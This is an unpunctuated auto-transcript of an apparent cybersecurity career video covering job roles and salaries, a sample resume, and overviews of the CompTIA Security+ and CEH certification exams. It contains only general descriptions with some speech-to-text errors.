crucial decisions by analyzing all of
this data with the rise of data there
has been a tremendous increase in the
number of cyber crimes across the globe
to prevent cyber attacks cyber security
is implemented so what is cyber security
it is nothing but the practice of
protecting networks programs computer
systems and their competence from
unauthorized digital access as mentioned
earlier companies rely on data and it is
required that the data is not
compromised or stolen to do this job we
have various cyber security
professionals who are skilled to protect
data from cyber attacks there has been a
sky-high growth in the number of cyber
security jobs this growth will only
double in the near future as companies
will always be on the lookout for
skilled professionals who can protect
the confidentiality of the data so now
that we know why cyber security jobs are
important let us have a look at the
various cyber security job rules there
are various kinds of cyber security job
roles let's go through few of the top
paying job roles going in the descending
order of the salary structures in the
usa we first have the chief information
security officer job role followed by
the security architect penetration
tester
then we have cyber security engineer
malware analyst and finally we will look
into the computer forensic analyst job
role i will now preview about each of
these job roles individually and look
into their responsibilities skills and
salary structures both in the usa and in
india so let's start off with chief
information security officer a ciso is a
senior level officer in any organization
he is entrusted with the safety of the
data in an organization a ciso has
various responsibilities they are
required to develop implement and
maintain an organization security and
risk management program they also
communicate with their organization
stakeholders and brief them about
various information related security
concerns by doing so they are able to
implement a better security system for
an organization at times a ciso would
have to also recruit an id team's
members they need to make sure that the
candidate is knowledgeable and skilled a
company's risk and vulnerabilities have
to be predicted beforehand prediction of
such risks and vulnerabilities are taken
care of by a ciso they play a major role
in preventing cyber attacks in any
organization let's now look at the
different skills required to be a chief
information security officer first and
foremost a candidate must have good
communication and presentation skills
this is very important for any
organization a degree in computer
science along with an mba is a preferred
qualification mba is not mandatory but
there is an added advantage if the
candidate has an mba along with a
computer science degree the candidate
must be good at handling security
breaches it is preferred that the
candidate has prior experience of
handling a security breach and who is
also good with incident management many
employers prefer candidates who have
global certifications to become a chief
information security officer the
preferred certifications are cism that
is certified information security
manager and certified information system
security professional cissp if a
candidate has either of these
certifications they have a better chance
of getting a job as a chief information
security officer let's now move on to
their salary structures a ciso earns
nearly 180 000 dollars in the usc in
india the salary is nearly 25 lakhs per
annum that's a lot of money so these
were the responsibilities skills and the
salary structure of a chief information
security officer let's move on to our
next role our next role is that of a
security architect a security architect
maintains the security of an
organization's computer systems they
prevent the computer systems from
malware attacks let's look into their
responsibilities first and foremost our
security architect identifies weak spots
in a system by performing vulnerability
tests these tests are carried out on a
regular basis along with vulnerability
tests risk analysis and security
assessments are also done by a security
architect installation of routers vpn
and firewalls are approved by a security
architect these devices are very
important when it comes to the security
of an information system well a security
architect rightly approves the
installation of these devices digital
signatures and public key
infrastructures are designed in addition
to all the ebar responsibilities a
security architect also provides
technical assistance and guidance to the
other security team members let's now
move on to the skills required to be a
security architect first and foremost
the candidate must have a computer
science or an information technology
degree coming to the experience the
candidate must have an experience in the
field of risk management as the role of
a security architect is a lot to do with
managing risks understanding of the
network basics and various security
protocols along with cryptography is
required to be a good security architect
lastly the preferred certification to
become a security architect is that of a
cissp which is certified information
system security professional as
mentioned earlier this is only a
preferred certification a candidate who
has this certification has a higher
chance of banking a security architect
job let's now look into the different
salary structures in the usc and in
india in the usa a security architect
earns nearly 123 000 dollars per annum
in india a security architect earns
nearly 20 lakhs per annum so that's all
about security architect let's now move
on to our next role that is penetration
tester a penetration tester also known
as an ethical hacker is a cyber security
professional who tries to exploit a
security system's vulnerabilities just
like how a hacker would do a penetration
tester mimics the role of a hacker let's
look into the various responsibilities
of a penetration tester as the name
suggests a penetration tester needs to
perform penetration tests to discover
and identify vulnerabilities in a system
in addition to this they are also
responsible for designing new
penetration tools all the penetration
tests results are documented and based
on the document new security measures
are discussed with the other it team and
the management a penetration tester
performs tests by developing codes and
they also conduct security audits which
help them understand the vulnerabilities
in a system let's now look into the
different skills required to be a
penetration tester a candidate must have
one to four years of experience in the
information security field knowledge of
windows linux unix operating systems is
required
also the candidate must know c and c
plus plus languages such as java php and
perl are preferred by employers but not
a requirement to successfully back the
position of a penetration tester the
preferred certifications are certified
ethical hacker that is ch and certified
expert penetration tester that is cept
let's look into the salary structures of
a penetration tester in the usa a
penetration tester earns nearly 117 000
dollars per annum and in india a
penetration tester makes nearly 4 lakh
rupees per annum
so those were the responsibilities
skills and salary structures of a
penetration tester
let's now move on to our next job role
that is
cyber security engineer on the whole a
cyber security engineer protects an
organization's network and its data they
also plan security measures to prevent
an organization from cyber attack let's
look into the responsibilities of a
cyber security engineer they design
cyber security platforms for a company
they are also responsible for planning
and implementing cyber security measures
well a cyber security engineer solely
designs plans maintains and implements
security measures in an organization
they are also required to report and
communicate with the other teams in an
organization a cyber security engineer
is different from a network security
engineer while a network security
engineer looks into the troubleshooting
a cyber security engineer looks into the
prevention of cyber attacks let's look
into the skills required to become a
cyber security engineer just like the
other job profiles a degree in computer
science or information technology is a
must well two years of experience in the
relevant field is required to become a
cyber security engineer a cyber security
engineer is needed to design security
systems hence a candidate with a good
problem solving skill is required along
with good problem solving skills the
candidate must also be good with
networking skills as mentioned earlier
knowledge of cnc plus plus is a must
java and python knowledge is preferred
to be a cyber security engineer moving
on to the salary a cyber security
engineer earns nearly 96 000 dollars in
the usa whereas in india a cyber
security engineer earns nearly 7 lakh
rupees per annum moving on to our next
job role that is malware analyst as the
name suggests a malware analyst is one
who identifies various cyber threats
such as worms viruses trojans boats to
understand their nature a malware
analyst is skilled at analyzing the
different malware threats in a system
let's now look into a malware analyst's
responsibilities they are responsible to
identify threats and once they identify
they are supposed to document the
methods to avoid such malware threats
they also research and develop malware
protection tools various malware
protection tools are developed by
malware analysts so that the next time a
cyber threat occurs they're able to
easily identify in addition to the above
responsibilities a malware analyst is
also responsible to constantly be
updated with the new malware threats
moving to the skills required a
candidate must know windows linux unix
operating systems and knowledge of c and
c plus plus is a must usage of tools
like ida pro early dbg reg short and tcp
view is suggested having a gi ac reverse
engineering malware certification is a
plus point the certification is only a
preferred certification it is not a must
that the candidate must process this
certification moving on to the salary
structure a malware analyst earns nearly
80 000 in the usa and earns nearly
rupees six lakhs per annum in india so
those were the skills responsibilities
and salary structure of a malware
analyst let's move on to our last job
role that is computer forensic analyst
previously we have seen the job roles
wherein they try to protect a company
from a cyber attack in this role we will
see how a computer forensic analyst
works after a cyber attack a computer
forensic analyst works on cases
following an attack they collect digital
evidences to retrieve information let's
look into their responsibilities with
the help of various investigation tools
a computer forensic analyst gathers
evidences from a system which was a
victim of a cyber attack their main
responsibility lies in recovering
deleted manipulated or stolen data a
computer forensic analyst helps various
officials in investigating a case by
discovering evidences from data which
was manipulated or compromised there
have been a lot of cases where a
computer forensic analyst has come to
the rescue of the police department
moving on to the skills the candidate
must hold a bachelor's degree and work
experience in the related field is
required for the post of a computer
forensic analyst it is not necessary
that the candidate must hold a computer
science degree
but the candidate must have relevant
work experience a candidate must have
knowledge of networking law and criminal
investigation as they have to do a lot
with investigating cases as well a sound
analytical mind is critical as they have
to analyze data and arrive at
conclusions as to identify the cyber
criminals the preferred certifications
to become a computer forensic analyst
are certified forensic computer examiner
that is cfce and certified computer
examiner that is cce well these were the
skill sets required to become a computer
forensic analyst moving on to the salary
structures a computer forensic analyst
earns nearly 71 000 in the usc and in
india a computer forensic analyst earns
nearly 8 lakh rupees per annum that was
all about computer forensic analyst well
those were the six top eight jobs in the
field of cyber security now i will run
you through a sample resume of a cyber
security engineer this is only a sample
resume of a cyber security engineer you
can alter it according to your own
preference here we first start off with
the name and your email id and phone
number then a quick summary about
yourself and what you're good at and
what you are looking for in an
organization after which you can give
your linkedin profile link and your
github profile link if you have one
moving on to the experience here you
would have to give the company's name
and the tenure ideally for a cyber
security engineer the minimum number of
years required is two and below that you
can write the different responsibilities
that were taken care by you in your
previous organization tcpip network
administration and security monitoring
are two important responsibilities that
any cyber security engineer must have on
their resume it is great if you have
configured firewalls and ids as well
underneath that you can mention the
education and it is required that you
have a degree in computer science or in
information technology you can then
mention your university and your gpa
moving on to the skills we have
technical skills and non-technical
skills here under technical skills you
would have to write the languages that
are known to you for example c c plus
plus which is a must java and python are
preferred too knowledge of windows linux
and unix operating systems will also
have to be on your resume if you're
applying for a post of a cyber security
engineer the other skills depend from
person to person here i have ids and ips
penetration vulnerability testing
encryption technologies knowledge of sql
and at the end you can also write the
certifications ideally a cyber security
engineer must have ccna ccnp
certifications in addition to it even a
compti certification is preferred moving
on to the non-technical skills here you
can mention the languages that you're
good at the different competitions that
you have participated in it can also
have your co-curricular activities and
anything to do with problem solving
would also be an added advantage first
let me briefly introduce comptia before
moving on to the comptia security plus
certification
the computing technology industry
association or better known as comptia
is a leading vendor-neutral i.t
certification provider in the world
comptia is considered one of the top
trade associations
its vendor neutral certification program
is undoubtedly one of the best in the
iit industry
for more than two decades comptia has
developed certification exams and
training for networking security open
source development and cloud to name a
few
comptia certifications continue to
address the requirements and necessities
of today's technology challenges comtia
certifications are grouped by skill set
presently comptia certifications are
classified into four areas core
infrastructure cybersecurity and
additional professional certifications
if you have a job that may involve some
sort of certification you must consider
obtaining that certification
certifications are very crucial comptia
certifications are a way for it
professionals to demonstrate their
knowledge of computers
let us now have a look at a few of the
certifications offered by comptia
first we have comptia a plus
comptia a plus certification is an entry
level certification for it technicians
this certification is designed for
employees who are seeking a career as a
support service center or networking
technician
this certification tests a candidate's
understanding of basic networking
troubleshooting and security skills
it covers laptop and pc hardware
software installation and configuration
of operating systems
according to comptia more than one
million it professionals hold the a plus
certification
next we have comptia network plus
you can either start with the a plus
certification however if you have the
experience you can move directly to the
comptia network plus certification
this certification is for professionals
who carry a minimum of nine months of
networking experience
here a candidate must be familiar with
networking technologies topology
security installation and configuration
and troubleshooting of wireless and
wired network devices
next we have comptia security plus
comptia security plus covers network
security concepts threats and
vulnerabilities access control identity
management cryptography and much more we
will closely look at the comptia
security plus certification in this
video and finally the comptia cloud plus
the comptia cloud plus certification
finds its importance as the cloud
computing market continues to grow by
leaps and bounds
this certification targets it
professionals with two to three years of
experience in storage networking or data
center administration
the certification exam tests the
candidates knowledge of cloud
technologies cloud markets and hybrid
and multi-cloud solutions
those were a few of the certifications
offered by comptia there are several
other certifications like comptia linux
plus comptia penn test plus and comtia
project plus to name a few
now let us have a look at the comtia
security plus certification in detail
so what is the comptia security plus
certification
well the comptia security plus
certification is a leading entry-level
it certification it is an essential
certification for professionals working
in the it industry
it is one of the first security
certifications that must be earned by it
professionals
it provides the core knowledge required
of any cyber security role and provides
a spring boot to various intermediate
level cyber security jobs
this certification teaches you how to
secure applications devices and networks
it also focuses on hands-on practical
skills in the field of network security
the certification teaches you skills
from spotting and mitigating risks to
troubleshooting security incidents
it is to be noted that id professionals
with comptia security plus know how to
address security incidents and not just
identify them
so now that you know what comptia
security plus certification is about let
us look at a few points as to why a
professional must choose this
certification
the first reason being it's a vendor
neutral certification
the comptia security plus certification
is vendor neutral which implies that you
don't have to center on technology and
security of a precise vendor the skills
and knowledge achieved through this
certification make security
professionals and network administrators
become in demand in the it marketplace
the comptia security plus certification
is globally acknowledged to be one of
the fundamental security certifications
in the field of cyber security
comptia security plus certification is
universally recognized and trusted
across the world
security plus provides hands-on skills
one of the few entry-level cyber
security certifications that emphasizes
on hands-on practical skills
this ensures a security professional is
better prepared to solve several complex
issues of the current times
the comptia security plus certification
is aligned with the latest techniques
and trends it covers core technical
skills in risk assessment and management
incident response foreign six and cloud
operations to name a few
thereby ensuring high performance on the
job
having this security certification
provides you a wider breadth of career
opportunities
the comptia security plus exam is
performance based which makes the
knowledge and skills learned more
applicable
there are numerous job roles that turn
to security plus to supplement baseline
cyber security skills
cyber security professionals are in
demand by organizations from both
private and public areas
with this certification you can take up
jobs related to compliance and
operational security threats and
vulnerabilities access control and
identity management and cryptography to
name a few
it is to be also noted that
professionals with the security plus
certification have greater opportunities
of receiving higher salaries than
non-certified professionals
another benefit of this certification is
that if you wish to get a cyber security
government job obtaining the comptia
security plus certification will be an
ideal starting point for you
so now that you know the perks of
achieving this certification what do you
have to do to achieve this well before
you can achieve this certification you
have to clear the comptia security plus
exam
let us now have an overview of the
comptia security plus exam
first and foremost who can take up this
exam although comptia does not have any
set prerequisites organizations
recommend that candidates meet these two
criterias let's have a look at the two
criterias
firstly the comptia security plus is for
it professionals who carry a minimum of
two years of experience in the it
administration focusing on security
the comptia security plus is ideal for
professionals who are looking to start
or advance a career in security
obtaining this certification prepares
the professionals for job roles like
system administrator security
administrator network administrator
junior penetration tester security
engineer and security consultant to name
a few
though comptia security plus is an entry
level certification it is strongly
recommended that you get the a plus and
network plus credentials before
proceeding to the security plus
certification
this will ensure that you have the
required technical skills like
configuring managing and troubleshooting
networks
now let's move on and understand the
comptia security plus exam details
comptia security plus
sy-0601 is the latest exam code that was
launched on 12 november 2020.
the
sy-0501 english language exam retires on
31 july 2021 hence we recommend you to
opt for the
sy-0601 exam
there are a maximum of 90 questions
comptia security plus exam has multiple
choice questions but some comptia
certification exams include
performance-based questions or pbqs
performance-based questions test a
candidate's ability to solve problems in
a simulated environment
the passing score for this certification
exam is 750 on a scale of 100 to 900.
the duration of the exam is 90 minutes
so time management is crucial to clear
the exam since you need to solve each
question within a minute
comptia security plus
sy-0601 exam is currently available in
english and japanese language you can
enroll for the exam by booking a slot
online or registering with pearson view
testing centers
the price of the comptia security plus
certification exam is 370 us dollars in
australia the price is 500 australian
dollars and in european currency it is
334 euros
let us now look at the focus areas of
comptia security plus exam
firstly this exam focuses on the core
cyber security skills required of any
cyber security role such as security
incident handling and response intrusion
detection malware prevention etc
the second area of focus is threats
attacks and vulnerabilities this
includes analyzing indicators of
compromise and determining types of
malware or comparing and contrasting
types of attacks
next up we have identity and access
management
this topic emphasizes on implementing
identity and access management controls
or differentiating common account
management practices
the fourth domain that comptia security
plus focuses on is risk management this
domain describes the importance of
policies plans and procedures related to
organizational security
finally we have cryptography and pki
here the exam deals with questions
related to comparing and contrasting
basic concepts of cryptography and
implementing public key infrastructure
another key focus area of this exam is
how to troubleshoot common security
issues and deploy mobile devices
securely
now coming to the final section of this
video where we look at the important
skills that you will acquire after
completing the comptia security plus
certification exam
first you will learn to detect various
types of compromise and understand
penetration testing and vulnerability
scanning concepts
this certification will give knowledge
to assess the security posture of an
enterprise network and recommend and
implement appropriate security solutions
you will also get an idea of installing
configuring and deploying network
components while assessing and
troubleshooting issues to support
organizational security you will gain
the desired skills to monitor and secure
hybrid environments including cloud
mobile and iot
comptia security plus certification
exams give the experience to install and
configure identity and access services
you will understand how to identify
analyze and respond to security events
and incidents
finally you will grab another crucial
skill that is to implement best
practices on risk management
comptia security plus certification will
make you understand how to implement and
summarize risk management best practices
and the business impact
it ensures you operate with an awareness
of applicable laws and policies
including the principles of governance
risk and compliance
that was all about the comptia security
plus exam taking up this exam will help
you learn a lot about cyber security and
acquire the necessary skills that will
help you become a greater cyber security
professional
this is why organizations look for
professionals with comptia certification
this certification is evidence of your
expertise in the security field
comptia security plus certification is
prevalent among security professionals
although the exam requires a lot of hard
work to crack the reward is very
fruitful
all the best to everyone who wishes to
be comptia security plus certified
now let's begin with who is a certified
ethical hacker a certified ethical
hacker is a person who is also known as
ethical hacker an ethical hacker is just
the opposite of a hacker a hacker is a
person who with malicious intent tries
to misuse vulnerabilities that they have
identified in an organization structure
and then gain access to unauthorized
data whereas an ethical hacker does the
same thing they try to locate the
weakness they try to look at the
vulnerabilities and they see how they
can be misused however the intent is
completely different and that is what
differentiates a hacker from an ethical
hacker hacker would be a criminal with a
malicious intent who would try to misuse
and personally gain by doing criminal
activity from that political activity
that they have done whereas the ethical
hacker would try to help the
organization
in an authorized manner so that's where
the permission comes into the picture
the ethical hacker has permission from
the organization to conduct some
activity that would identify
vulnerabilities or weaknesses in the
information technology structure of that
organization
and then once they have been identified
the ethical hacker would then help the
organization to plug those
vulnerabilities rather than misuse those
vulnerabilities so any person who
completes ch version 10 certification is
known as a certified ethical hacker so
this is a certification once you
complete that once you pass the exams
you can essentially call yourself as a
certified ethical hacker and you're
going to get a certificate with the same
terminology so as you can see in the
diagram your responsibility would be as
a certified ethical hacker would be with
the proper permission of the
organization with the authorization
coming in with contracts coming in you
would legally help the organization to
identify those weaknesses and
vulnerabilities and once you find them
you're going to report them to the
organization and you're going to help
the organization with remediation plan
which would help them remediate mitigate
and resolve the vulnerabilities that
you've identified thus making the
organization's security structure a lot
better based on which black hat hackers
or malicious hackers would be unable to
attack the organization so what is ch
version 10 now this course was initially
introduced in september 2015 and i think
if you look at the versioning this is
the 10th version that is there in the
market so essentially ceh or the
certified ethical hacking course as the
course itself has been for a long time
in the industry it's a very well
accepted course and it's a well-renowned
course the current version as it is was
uh introduced in september 2015 and is
one of the toughest certifications in
the cyber security field this includes a
lot of information that you have to
learn that you have to know before you
can attend the certification you will
master all ethical lacking methodologies
that are used in penetration testing and
ethical hacking situations what does
that mean that means that ceh version 10
is a structured course that will help
you look at all the phases that are used
in ethical hacking all the terminologies
that are utilized all the tools that are
utilized in such a manner that you can
penetration test or a vulnerability
assessment and identify and test the
vulnerabilities for their complexity and
this course once you complete the course
you would have mastered all the ethical
hacking techniques that are required
there are two exams one is a written
exam and the other is a practical exam
now you can opt for either or the
written exam is basically a multiple
choice question exam where they'll ask
you scenario based questions and you
have to answer those questions that is
something that we're going to look into
during this video the practical exam is
basically a simulation exam where they
give you a scenario and you have to
complete some
complete those tests and prove that you
are a good ethical hacker based on the
report that you give if the report
tallies to what the test was you would
be clearing that exam so practical exam
is a little bit tougher it's more
hands-on it tests this actual skills
that you would perform in a hacking
scenario or ethical hacking scenario
does the practical exam going to be that
much tougher the written exam to give it
credence tests you a lot on your
mentality on your thought process on
your judgment characteristics so they
will give you a scenario and ask you
what do you think is happening what does
this attack trend amount to or would be
then what what would be the next step in
the particular attack that they're
describing does it's more of an
intellectual uh test where your when
your thought process are being checked
and uh you are giving this exam so what
would be the difference between these
exams in a practical exam you would be
conducting all those steps yourself and
you would be reaching a conclusion so
here essentially you're being tested on
the skills that you have developed on
the execution part of it and to see
whether you can execute a test end to
end whereas in a written exam you will
be put in the middle of a test where you
have to assume something where you have
to understand what the steps would have
been performed in the in the previous
steps and what would be the expected
result and you're supposed to analyze
that and then come to the correct answer
so if there is a question which which
exam is better written or practical the
answer to that is from an intellectual
perspective a written exam would be a
lot tougher than a practical exam and
from an execution perspective a
practical exam would be tougher than a
written exam so it depends on us which
exam we want to give both of them are
widely accepted and well respected in
the information security field so it's
just the option that we choose which
exam we want to give now this course the
version 10 course is purely attack based
course okay it is an offensive course
there is no defensive mechanisms so if
you are looking for questions of how to
secure yourself on the internet how to
securely configure operating system or
how to securely configure a server how
to configure a firewall this is not the
certification this basically talks about
attacking those devices so if you come
across a firewall how would you test a
firewall how would you identify
vulnerabilities in those and how would
you bypass a firewall similarly if you
come across a server how are you going
to attack and hack the server let it be
windows or linux based so this basically
becomes an attack based course you're
looking at offensive mechanisms over
here and not defensive ones at all so
what's new in this version in this
version there's a new module for iot
internet of things it focuses on
emerging attacks vectors like cloud
artificial intelligence and machine
learning it basically talks about smart
devices and it talks about the
vulnerabilities the risk that the smart
devices face in today's world for
example it will tell you about the
industries that are utilizing all these
smart devices why are they utilizing it
for what kind of devices they are
utilizing and what are the risks within
those devices it will also give you a
lot of tools for you to practice upon to
identify such iot devices what would
constitute an iot or internet of things
device any device which has an ip
address and can connect to the internet
and create data so even your smart watch
your smartphone your cars that have
internet connectivity nowadays uh your
google homes amazon alexas all of these
devices would come under the iot
umbrella and have you ever wondered
about sitting at home having a wi-fi
having all of these devices even a smart
tv if you will connected to the wi-fi
and have you ever questioned how a
hacker would then be able to access your
home through all of these devices record
information and
basically just spy on you similarly an
organization where they are utilizing
iot they would be vulnerable for the
same vulnerabilities and this course
does include iot security to a certain
extent where we talked about
vulnerabilities and how to identify
those vulnerabilities in iot then
there's a new vulnerability analysis
module where it gives you risk
assessment it talks about cbss scoring
systems it talks about how to do a
vulnerability management program in the
first place what are the steps required
in a vulnerability management program
how should it be reputable and how it
should be measurable as a program and
what should be the outcome so basically
it will give you a structured way of how
to do a vulnerability management
assessment and how do you want to
achieve the end goal thus leading you to
a penetration test so all the modules
are leveled up what do you mean by
leveled up that means they've been
updated to the latest tools latest
standards latest technologies so you've
got cryptographic attacks you have got
attacks on applications like sql
injection we'll be talking about packet
sniffing using various tools all of
these are upgraded which means they are
up to the latest operating system so
even when we do this course you'll be
looking at operating systems like
windows 10 windows 8 windows server 2012
windows server 2016 kali linux machines
android machines and ubuntu desktop as
well so all of the operating systems are
latest the tools are latest and you will
be interacting with these tools and then
there is a mobile security toolkit as
well which will help you do a
penetration test on a mobile device so
these are what is new in version 10. now
let's talk about the roles and
responsibilities that ethical hacker
should have when they actually go into
the world now what are the
responsibilities roles what are the
capabilities that we should have that we
should be able to look at scripts that
would test for vulnerability so for
example a sequel injection attack it's a
script-based attack let's say a
cross-site scripting attack that is
again going to be a script-based attack
so we uh maybe we want to go ahead a
little bit look at windows systems and
do a powershell attack and know about
partial scripting a little bit if you
look at linux windows there's a bash
shell where there's bash scripting and
you'll want to learn that scripting as
well now the course doesn't include all
these scripting languages it does help
you understand what these scripting
languages are and it does have some
basic introduction to how these
languages can be utilized to create
those scripts then we also want to
develop tools to increase security you
want to look at those commands that are
utilized on all operating systems you
want to look at the capabilities of the
operating systems of how to create
security parameters and ensure the
operating systems and applications
devices are secure uh you should be able
to perform risk assessment now when you
say risk assessment risk assessment is
the likelihood of an attack being
actually executed on an organization
based on the threats and the
vulnerabilities that we have identified
so risk assessment is something that you
find out of vulnerability and then you
try to figure out in a hypothetical
manner of what is the likelihood of that
vulnerability being exploited by a
hacker if they find that vulnerability
and if they do execute that what is the
impact that is going to happen on the
organization and what is the penalties
or the repetitions that the organization
is going to face if that vulnerability
is exploited that's what a risk
assessment is then we should also be
able to develop security policies or set
up security policies and implement them
to ensure that the security mechanisms
are standardized and are consistent and
then we should also look at training
staff for network security to ensure
that they are aware of these
vulnerabilities and they know what their
responsibilities are to maintain some
semblance of security in the
organization so why do we want to become
a certified ethical hacker now since
you're watching this video it's easy to
assume that we all are interested in
security we all are interested in
hacking but hacking is not a real job
for us to get a job in the industry on a
security parameter or information
security parameter we want to become a
certified ethical hacker so if you look
at the popular hacking cases that have
happened in 1990s there was a national
crackdown on criminals microsoft nt
operating system was hacked now this was
back in the 90s when security wasn't
that much evolved and there were a lot
of attacks back then that crippled
infrastructure that crippled banks when
they started realizing that computing
isn't as easy as it seems of course if
you use a computer the functionality is
always there but if the functionality is
not properly configured you're just
exposing yourself to cyber criminals
where they're going to steal information
and your organization may just go
bankrupt because of that in 2013 an
example adobe reported 2.9 million
accounts as stolen in 2016 kaspersky
which is a internet security firm
announced that there was 758 million
malicious attacks that occurred
worldwide imagine that 758 million
malicious attacks that were identified
and reported in 2018 facebook reported a
loss of 30 millions to accounts that
were stolen 2018 again quora reported
100 million customer accounts being
stolen and in 2018 again marriott 500
million travelers accounts stolen and
manipulated now when you see account for
a stolen how does it affect the
organizations now first and foremost if
those accounts were stolen that means
usernames and passwords were cracked and
those accounts may have contained credit
card information or may have contained
some personal information that would
identify the personal
the person and does make them gullible
for a social engineering attack or an
identity theft attack so it has a
cascading effect if i would have been
affected or you would have been affected
with these attacks the repercussions
would have been catastrophic your credit
card information being stolen that means
somebody else would have misused it and
you would have uh seen a huge bill come
to come your way now you can go back to
the bank and dispute that but that
that's again uh a dispute that you're
trying to
have with the bank for something that
you didn't do which requires a lot of
energy and a lot of time and at the end
of it somebody has to pay for that
particular loss now in this scenario the
bank would have had to bear the loss but
then that's a loss for the bank and bank
doesn't want to do that and that's where
they would try to hire certified ethical
hackers who would try to test these
vulnerabilities and plug them in so that
the end consumer is also secured the
bank is also secure right in this case
uh
there were 500 million travelers
accounts that were stolen a lot of
credit card information uh was uh leaked
out email email accounts were hacked and
compromised and does there was a lot of
replication that happened now the thing
is that there are also laws that these
organizations need to adhere to that
tell the organizations how to keep their
information secure and also have
penalties in place if the organization
gets hacked and the penalties are pretty
severe so organizations do not want to
get hacked or do not want to get
compromised not only from the customers
perspective where they would be losing
customers losing reputations and then
thus facing losses but also from a
legislative perspective where they would
have to pay fines to the government for
the frauds that have happened so these
are some of the popular hacking cases
that have cost these organizations quite
a lot of money and does uh they have a
lot of security in mind uh if you look
at the news
in bbc news there was something reported
from a french uh police that there was a
virus that infected more under 850 000
computers worldwide now on the similar
lines if you remember ransomwares and if
you look at wannacry that happened in
2018 or 2017 it also cost the world four
billion dollars in losses during that
just one small month of its infection
then apple google basically disclosed
that a large scale hacking effort was
targeted at apple devices and this has
been uh it has reported that there was a
sustained effort to hack high iphones
over a period of at least two years
which means that there's a specific
target towards apple consumers and they
are at a higher risk of getting hacked
than others then the texas government
organizations hit by rap somewhere
attack so hackers have infected 23
organizations connected to local
government in the u.s state of texas
with ransomware that means that their
databases have been encrypted the
government themselves do not have access
to that database the databases could
have been compromised by the hackers and
that means that whatever services were
being provided to the users based on
that database may no longer be available
to the end users because of the
ransomware now moving on with these why
won't do we want to become a certified
ethical hacker increased attacks lead to
more job openings now if you look at
ransomware the vonakura attack that
happened in 2017 there was a knee-jerk
reaction given by the rest of the world
for i.t security suddenly budgets or
started opening up suddenly people
wanted more ethical hackers on their
payrolls to test for vulnerabilities in
uk and europe we have gdpr which is
again another law that
imposes cv of penalties on organizations
that get hacked and for not having
proper security and a voluntary
assessment and penetration testing
program in place so that leads to a lot
of job requirements as well where
organizations look at people with this
special skill set to help them mitigate
the vulnerabilities to keep to safeguard
them and their customers from hackers
and also from penalties from law
enforcement and governments so
does the demand keeps on increasing for
ethical hackers which automatically
means that the salaries are going to
increase as well so more the demand
lesser the supply higher the salaries
that's plain economics then challenge
hacker with malicious intent so from a
ethical hacker's perspective it is our
duty to safeguard an organization which
means that will be pitched against
hackers and we have to ensure that those
hackers would be challenged to the
maximum limit before they even try to
get access to any of the resources that
we are trying to protect it offers a
boost in your career so more uh efforts
that you put in more vulnerabilities
that you find the better the career
prospects that you have and the better
job aspects that you're going to get and
this also lets you keep yourself updated
on the latest technology as the
technology progresses as we evolve on
technology security will also evolve and
the ethical hacker would need to keep
themselves updated on these technologies
let us understand the importance of the
ca certification before getting to know
about its content
so why should you take up the ch version
11. the certified ethical hacker is the
most trusted ethical hacking
certification and a recommended one by
employers around the globe
since the introduction of the ca
certification in 2003 it is globally
recognized as a standard within the
information security field the ch
version 11 by ec council continues to
keep up to the standard and it
familiarizes the latest hacking
techniques and teaches you advanced
hacking tools and exploits used the ch
version 11 aligns with the current cyber
security market requirements and adds
the latest advancements in the cyber
security field
the c8 certification helps and trains
you to think like a hacker and this in
turn helps you beat a hacker and defend
your network after obtaining the ca
certification you'll be a certified
ethical hacker a certified ethical
hacker is a skilled professional working
in a red team environment who safeguards
networks and understands attack
strategies and mimics the skills of
malicious hackers certified ethical
hackers discover vulnerabilities in a
system and operate with permission from
the system owners only
so who can become a certified ethical
hacker and who can take up the ca
certification let us have a look at that
now
in the first case to be eligible for the
ca certification exam you need to attend
the official training from authorized ec
council training partners it can be an
online training or tutor led training
from ec council learning partners only
then are you eligible to take up the ca
certification exam
so a candidate who has completed an
official ec council training is eligible
to take up the exam without going
through the application process
or in the second case in order to be
considered for this credential you need
to have at least two years of work
experience in the information security
domain and you must pay a non-refundable
application fee and submit an
eligibility application form
once it is approved you can take up the
ch exam after the application is
approved you can purchase the test
voucher
in the latest version of the ceh we will
see the addition of various core
concepts moving on to our next topic let
us see how different the ch version 11
is and few of its objectives
firstly it outlines ethical hacking
concepts cyber kill chain concepts and
overview of information security and
various laws and regulations related to
information security this certification
briefs you about the faces of system
hacking attacking techniques and how you
can maintain access
it also briefs you about footprinting
concepts and ways of utilizing food
printing tools along with necessary
countermeasures
the next objective is to familiarize
with vulnerability assessment along with
a hands-on experience of various
scanning tools
next we have cyber security threats like
malware threats analysis of various
worms viruses and trojans various
malware concepts packets sniffing
concepts and techniques have been
introduced into this domain
it also highlights the concepts related
to social engineering denial of service
attacks sql injection and aviation
techniques
it also speaks about wireless hacking
concepts and mobile device management
the concept of operational technology is
a new addition this time
next is getting acquainted with security
solutions like firewalls honeypots ips
their evasion and protection
our fifth point is knowing various
topics in cryptography like encryption
algorithms public key infrastructure and
cryptanalysis
moving on the next objective is to
incorporate padded security os as it
offers better performance on lower
powered laptops and machines when
compared to kali linux
next is to learn to recognize and deal
with iot based vulnerabilities and
attacks with the ch version 11 course
that covers the latest iot hacking tools
you would be required to ensure the
safety of iot devices
our next point is with respect to the
evolving cloud industry you would need
to learn how to identify and defend
cloud-based threats and attacks
the latest version of ch includes new
operating systems and windows 10
configured with domain controller and
vulnerable web applications for
improving hacking skills
finally what is different is that more
than 50 percent of the ch version 11
course is dedicated to practical skills
in live ranges via ec council labs ec
council leads in this aspect of the
industry now that we saw the ch exam
objectives let us look into the ch exam
topics weightage
as you see on your screens this is a pie
chart with nine domains in ch along with
their weightages you can prepare for
your exam accordingly
let us move on and take a closer look at
each of these domains their respective
subdomains and their descriptions
our first domain is information security
and ethical hacking overview
this domain consists of questions from
information security cyberkill chain
concepts ethical hacking concepts
various hacking concepts and information
security laws and standards
you can expect a total number of eight
questions from this domain the weightage
of this section is six percent
the second domain is reconnaissance
techniques under the subdomains we have
footprinting and reconnaissance at first
this covers various topics like
footprinting concepts footprinting
methodology email footprinting
footprinting through web services dns
footprinting footprinting through social
engineering etc
the next subdomain in this section is
scanning networks
scanning networks covers various
concepts like scanning tools host
discovery port and service discovery os
discovery draw network diagrams scanning
beyond ids firewall etc
and our third subdomain under
reconnaissance techniques is enumeration
various topics like snmp enumeration ntp
and nfs enumeration smtp and dns
enumeration and enumeration counter
measures are covered under this
subdomain
a total of 26 questions will be asked
from this domain
under footprinting and reconnaissance
you will have 10 questions and under
scanning networks and other 10 and
finally under enumeration you will have
6 questions
a total weightage of 21 percent is given
to this particular topic
our third domain is system hacking faces
and attack techniques
under our third domain our first sub
domain is about vulnerability analysis
this subdomain covers topics on
